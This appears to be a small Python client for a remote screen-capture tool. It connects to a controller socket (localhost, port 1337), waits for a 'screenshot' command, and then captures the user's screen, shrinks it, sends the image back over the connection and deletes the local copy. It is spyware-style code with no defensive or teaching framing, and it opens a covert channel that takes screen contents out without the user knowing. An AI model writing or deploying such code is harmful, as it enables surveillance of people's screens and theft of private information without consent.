#!/usr/bin/env python

import socket
import os
import sys
import pyscreenshot as ImageGrab
from PIL import Image

def take_screenshot(sock):
    im = ImageGrab.grab()
    im.save("lol.jpg")
    foo = Image.open("lol.jpg")
    foo = foo.resize((300,100),Image.ANTIALIAS)
    foo.save("lol.jpg",quality=70)
    msg = "0" + open("lol.jpg").read()
    os.remove("lol.jpg")
    sock.send(msg)

def connect(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, 1337))
    return sock

def main():
    sock = connect("127.0.0.1")
    while True:
        msg = sock.recv(2048)
        if msg == "screenshot":
            take_screenshot(sock)

if __name__ == '__main__':
    main()
